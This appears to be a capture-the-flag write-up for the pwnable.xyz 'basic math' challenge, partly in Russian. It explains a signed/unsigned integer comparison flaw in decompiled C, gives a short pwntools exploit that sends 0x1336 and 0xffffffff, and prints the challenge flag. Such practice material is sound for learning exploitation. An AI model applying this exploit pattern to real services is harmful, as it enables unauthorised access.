Do you know basic math?
svc.pwnable.xyz : 30001
Author: [uafio](https://pwnable.xyz/user/2/)
[download](https://pwnable.xyz/redisfiles/challenge_22.gz)

Исходный код:
``` C
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int a; // [rsp+0h] [rbp-18h] BYREF
  int b; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 canary; // [rsp+8h] [rbp-10h]

  canary = __readfsqword(0x28u);
  set_buf(a1, a2, a3);

  a = 0;
  b = 0;
  _printf_chk(1, "1337 input: ");
  _isoc99_scanf("%u %u", &a, &b);
  if ( a <= 0x1336 && b <= 0x1336 )
  {
    if ( a - b == 0x1337 )
      system("cat /flag");
  }
  else
  {
    puts("Sowwy");
  }
}
```

Уязвимость: переменные `a` и `b` читаются как беззнаковые, а дальнейшее сравнение и вычитание работает как со знаковыми числами. Если записать `0xffffffff`, то в знаковом варианте он будет означать `-1`.

Эксплоит:
``` python
io = start()

num1 = 0x1336
num2 = 0xffffffff
io.sendlineafter(b': ', f'{num1} {num2}'.encode())

io.interactive()
```

Запуск:
![](../../../z.%20Images/{E36CA9DA-AA43-48F4-B331-CCFDB4476DA5}.png)

Ответ: `FLAG{sub_neg_==_add}`